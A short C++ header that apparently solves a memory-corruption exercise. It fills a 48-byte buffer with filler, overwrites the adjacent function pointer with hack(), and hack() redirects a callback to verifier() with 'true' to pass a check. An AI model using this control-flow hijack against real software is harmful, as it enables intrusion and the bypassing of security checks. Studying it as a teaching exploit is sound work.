#pragma once
#include "callback.h"
#include <ranges>
#include <algorithm>
#include <iostream> // Debug

void verifier(callback &f);

void hack(callback &f) {
    f.reset(verifier);
    f.init_args<bool>(true);
}

void request(callback &f) {
    struct hack_buf {
        char buf[48];
        void *f;
        char padding[8] = {};
    };

    hack_buf buf;

    std::ranges::fill_n(buf.buf, 48, 'a');
    buf.f = reinterpret_cast<void *>(hack);

    f.init_args<hack_buf>(buf);
}

callback get_request() { return callback { request }; }
